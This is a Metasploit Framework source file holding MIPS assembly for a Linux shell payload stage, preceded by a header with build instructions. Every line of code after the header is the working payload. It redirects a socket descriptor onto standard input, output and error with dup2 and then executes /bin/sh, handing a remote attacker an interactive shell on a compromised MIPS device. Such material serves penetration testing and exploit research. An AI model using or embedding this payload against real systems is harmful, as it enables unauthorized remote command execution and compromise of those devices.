##
#
#        Name: stage_tcp_shell
#        Type: Stage
#   Qualities: Compatible with both mips little and big endian
#   Platforms: Linux
#     Authors: juan vazquez <juan.vazquez [at] metasploit.com>
#     License: 
#
#        This file is part of the Metasploit Exploit Framework
#        and is subject to the same licenses and copyrights as
#        the rest of this package.
#
# Description:
#
#        This payload duplicates stdio, stdin and stderr to a file descriptor,
#        stored on $s2, and executes /bin/sh.
#
#        Assemble and create a relocatable object with:
#          as -o stage_tcp_shell.o stage_tcp_shell.s
#
#        Assemble, link and create an executable ELF with:
#          gcc -o stage_tcp_shell stage_tcp_shell.s
#
#        The tool "tools/metasm_shell.rb" can be used to easily
#        generate the string to place on:
#          modules/payloads/stages/linux/mipsle/shell.rb
#        and:
#          modules/payloads/stages/linux/mipsbe/shell.rb
##
	.text
	.align  2
	.globl  main
	.set    nomips16
main:
	.set    noreorder
	.set    nomacro

	# dup2(sockfd, 2)
	# dup2(sockfd, 1)
	# dup2(sockfd, 0)
 	# a0: oldfd (sockfd)
 	# a1: newfd (2, 1, 0)
	li      $s1, -3
	nor     $s1, $s1, $zero
	add     $a0, $s2, $zero
dup2_loop:
	add     $a1, $s1, $zero # dup2_loop
	li      $v0, 4063       # sys_dup2
	syscall 0x40404
	li      $s0, -1
	addi    $s1, $s1, -1
	bne     $s1, $s0, dup2_loop	# <dup2_loop>

	# execve("/bin/sh", ["/bin/sh"], NULL)
	# a0: filename "/bin/sh"
	# a1: argv ["/bin/sh", NULL]
	# a2: envp NULL
	li      $t8, -1         # load t8 with -1
getaddr:                    # getaddr trick from scut@team-teso.net
	bltzal  $t8, getaddr    # branch with $ra stored if t8 < 0
	slti    $t8, $zero, -1  # delay slot instr: $t8 = 0 (see below)
	addi    $a0, $ra, 28    # $ra gets this address
	sw      $a0, -8($sp)
	sw      $zero, -4($sp)
	addi    $a1, $sp, -8
	slti    $a2, $zero,-1
	li      $v0, 4011       # sys_execve
	syscall 0x40404

	.string "/bin/sh"
	.set    macro
	.set    reorder
